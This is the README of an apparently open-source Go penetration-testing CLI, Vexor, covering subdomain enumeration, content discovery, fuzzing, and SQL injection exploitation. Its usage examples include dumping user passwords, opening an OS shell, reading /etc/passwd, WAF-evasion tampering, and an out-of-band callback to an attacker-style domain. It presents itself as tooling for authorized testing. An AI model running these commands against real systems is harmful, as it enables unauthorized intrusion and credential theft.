<p align="center">
  <img alt="Vexor" src="https://img.shields.io/github/license/0xseif-code/vexor?style=flat-square">
  <img alt="Go Version" src="https://img.shields.io/badge/Go-1.21%2B-00ADD8?logo=go&logoColor=white&style=flat-square">
  <img alt="Language" src="https://img.shields.io/badge/Language-English%20%7C%20%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%8A%D8%A9-9f7be1?style=flat-square">
</p>

```
 ██╗   ██╗███████╗██╗  ██╗ ██████╗ ██████╗
 ██║   ██║██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗
 ██║   ██║█████╗   ╚███╔╝ ██║   ██║██████╔╝
 ╚██╗ ██╔╝██╔══╝   ██╔██╗ ██║   ██║██╔══██╗
  ╚████╔╝ ███████╗██╔╝ ██╗╚██████╔╝██║  ██║
   ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
        Offensive Security Toolkit
```

# Vexor

**Read this in [العربية](README.ar.md)** — [قراءة هذا الملف باللغة العربية](README.ar.md)

Vexor is a Go CLI for subdomain enumeration, web content discovery, parameter
fuzzing, and SQL injection testing. Ships as one static binary, no runtime
dependencies.

---

## Features

- Subdomain enumeration: DNS brute-force + crt.sh lookup, dedup, custom resolvers
- Directory discovery: wordlist probing with soft-404 filtering, recursion, extension presets, status/size filtering
- Parameter fuzzing: `FUZZ` markers in URL, headers, and body, with status/size/regex match and filter rules
- SQLi engine: boolean, error, time, union, stacked, and OOB detection, then full exploitation (`--dbs`, `--tables`, `--columns`, `--dump`, `--os-shell`, `--read-file`, `--write-file`)
- WAF-aware payload tampering (`--auto-tamper`), plain/json/csv output, cached SecLists wordlists, shared proxy/threads/headers flags

---

## Installation

### Option 1 — `go install`

Requires **Go 1.21+**:

```bash
go install github.com/0xseif-code/vexor/cmd/vexor@latest

# make sure $GOPATH/bin (or $HOME/go/bin) is on your PATH
export PATH="$PATH:$(go env GOPATH)/bin"    # Linux / macOS
```

Verify:

```bash
$ vexor version
Vexor v1.0.0 (build unknown)
```

### Option 2 — From source (`make`)

```bash
git clone https://github.com/0xseif-code/vexor.git
cd vexor

make build          # Linux / macOS → ./bin/vexor
# or plain go build -o vexor ./cmd/vexor

# Windows
go build -o vexor.exe ./cmd/vexor

sudo install -m755 bin/vexor /usr/local/bin/    # optional: system-wide
```

### Option 3 — Download a release binary

Grab the latest prebuilt binary for your platform from the
[Releases](https://github.com/0xseif-code/vexor/releases) page. Assets are
named `vexor-<os>-<arch>[.exe]`, e.g. `vexor-linux-amd64`,
`vexor-darwin-arm64`, `vexor-windows-amd64.exe`.

---

## Quick Start

```bash
# Download the wordlist cache once after installing
vexor update-wordlists

# Available commands
vexor --help
```

| Command | Description |
|---|---|
| `vexor subdomain` | Enumerate subdomains (DNS brute-force + crt.sh) |
| `vexor dir` | Discover files and directories on a web target |
| `vexor fuzz` | Fuzz URL / headers / body with `FUZZ` markers |
| `vexor sqli` | Detect and exploit SQL injection |
| `vexor update-wordlists` | Re-download and verify the cached SecLists mirror |
| `vexor version` | Print the version and build info |

### Global flags

Every command shares the same global controls:

```
--timeout <s>      global request timeout in seconds            (default: 10)
--threads <n>      global concurrency thread count              (default: 50)
--proxy <url>      HTTP/SOCKS5 proxy, e.g. http://127.0.0.1:8080
--headers <h>      custom header, repeatable, e.g. -H "User-Agent: custom"
--format <fmt>     output format: plain, json, csv              (default: plain)
--output <file>    save results to a file (in addition to stdout)
--silent           suppress banner, progress bars, and info logs
--no-color         disable ANSI colored output
```

Results go to **stdout** (monochrome, pipe-friendly); logs and progress go to
**stderr** — so `vexor dir -u URL | tee results.txt` just works, and
`--format json` is ready for `jq`.

---

## Usage Examples

### `vexor subdomain`

Active DNS brute-force + passive crt.sh enumeration:

```bash
$ vexor subdomain -d example.com -s medium --threads 100

[*] starting subdomain enumeration: example.com (mode=dns+crtsh, threads=100, size=medium)
api.example.com
app.example.com
blog.example.com
cdn.example.com
dev.example.com
shop.example.com
...
[+] domain example.com: 42 subdomains (dns=31, crtsh=11) in 12.4s
[+] subdomain enumeration complete: 42 total subdomains in 12.6s
```

Target many domains from a file, or use a custom wordlist:

```bash
vexor subdomain -l domains.txt -s large
vexor subdomain -d example.com -w my-subdomains.txt
vexor subdomain -d example.com --active-only --resolvers 8.8.8.8:853 --resolvers 1.1.1.1:53
```

### `vexor dir`

Content discovery with recursion and filtering:

```bash
$ vexor dir -u https://example.com -x php,js -r --depth 2

[*] starting content discovery on https://example.com (threads=50, depth=2, exts=php,js)
200	2.1 KB	https://example.com/index.php	Home
200	1.4 KB	https://example.com/login.php	Login
302	0 B		https://example.com/admin/	
301	0 B		https://example.com/backup/	
200	3.8 KB	https://example.com/admin/config.php	Configuration
...
[+] content discovery complete: 18 findings, 4812 requests, 0 errors in 3m12s
```

Cull false positives in one shot:

```bash
vexor dir -u https://example.com -x all --filter-status 404 --filter-size 4297 -r
vexor dir -u https://example.com --match-status 200,301,302 --rate 100
```

### `vexor fuzz`

Mark injection points with `FUZZ` — in the URL, headers, or body:

```bash
$ vexor fuzz -u "https://example.com/api/query?id=FUZZ" -w parameters --match-status 200,500

[*] starting fuzzing GET https://example.com/api/query?id=FUZZ (threads=50, wordlist=parameters)
[200] https://example.com/api/query?id=admin (id=admin)
[200] https://example.com/api/query?id=debug (id=debug)
[500] https://example.com/api/query?id=__proto__ (id=__proto__)
...
[+] fuzzing complete: 3 hits, 1411/1411 checked, 0 errors in 41.7s
```

Fuzz method + body, filter the noise:

```bash
vexor fuzz -u "http://target/login" -d "user=FUZZ&pass=x" -X POST -w usernames
vexor fuzz -u "https://example.com/search?s=FUZZ" --filter-size 0 --filter-regex "no results"
vexor fuzz -u "https://example.com/page?q=FUZZ" --delay 100ms --match-regex "SQL syntax"
```

Presets: `parameters`, `extensions`, `usernames`, `passwords`,
`passwords-large`, `endpoints` — or pass any file path as `-w`.

### `vexor sqli`

Detection across every parameter (boolean, error, time, union, stacked, inline, OOB):

```bash
$ vexor sqli -u "https://example.com/page?id=1" --level 2

[*] starting SQL injection scan on https://example.com/page?id=1 (dbms=auto level=2 risk=1 threads=50)
URL query parameter/GET/id technique=boolean dbms=mysql confidence=95
URL query parameter/GET/id technique=error   dbms=mysql confidence=88
POST form parameter/POST/user technique=time      dbms=mysql confidence=76
...
[+] scan complete: 3 findings, 412 requests, 2 errors in 2m05s
[i] fingerprinted DBMS: mysql
```

Then exploit the first confirmed point:

```bash
vexor sqli -u "https://example.com/page?id=1" --dbs
vexor sqli -u "https://example.com/page?id=1" --tables -D shop
vexor sqli -u "https://example.com/page?id=1" --columns -D shop -T users
vexor sqli -u "https://example.com/page?id=1" --dump -D shop -T users -C id,username,password
vexor sqli -u "https://example.com/page?id=1" --os-shell
vexor sqli -u "https://example.com/page?id=1" --read-file /etc/passwd
```

Also supports raw Burp requests, tamper chains, and out-of-band channels:

```bash
vexor sqli -r request.txt -p id
vexor sqli -u "https://example.com/page?id=1" --auto-tamper
vexor sqli -u "https://example.com/page?id=1" --tamper space2comment,randomcase
vexor sqli -u "https://example.com/page?id=1" --oob-domain yourdomain.attacker.com
```

### `vexor update-wordlists`

Vexor caches wordlists in `~/.vexor/wordlists` and pulls from a SecLists mirror.
Run this once after installing — and any time you want fresh data:

```bash
$ vexor update-wordlists

[*] re-downloading all wordlists into ~/.vexor/wordlists
[*] downloading...  65.30% (18.4 MB / 28.2 MB)
[+] wordlist cache updated: 3 files in 46.8s
[i]   directory/medium    8.2 MB  sha256=9f1e4c22a1b3
[i]   subdomain/large    14.3 MB  sha256=4c8d0e71f5a2
[i]   fuzz/parameters     5.7 MB  sha256=b2a9d0134e6e
```

> `subdomain`, `dir`, and `fuzz` pick their wordlist automatically by size
> (`-s small|medium|large`) or an explicit path (`-w`).

---

## Output Formats

```bash
# JSON, pipe into jq
vexor subdomain -d example.com --format json | jq -r '.subdomain'

# CSV into a spreadsheet
vexor dir -u https://example.com --format csv -o results.csv

# Plain works everywhere; stdout stays pipe-friendly
vexor sqli -u "https://example.com/page?id=1" | tee sqli.log
```

---

## Project Layout

```
cmd/vexor/        CLI entry point (Cobra commands)
internal/fuzz/    Parameter fuzzing engine
internal/sqli/    SQL injection detection & exploitation
internal/enum/    Subdomain enumeration + directory discovery
internal/httpclient/  Fast concurrent HTTP client
internal/wordlists/   Cached SecLists mirror + integrity checks
```

---

## Legal & Disclaimer

**Use responsibly. Authorized testing only.**

Vexor is an offensive security tool. Only use it against systems you own or
have written permission to test. Unauthorized access to computer systems is
illegal in most jurisdictions. The author assumes no liability for misuse.

## License

Released under the [MIT License](LICENSE). Copyright (c) 2026 0xseif-code.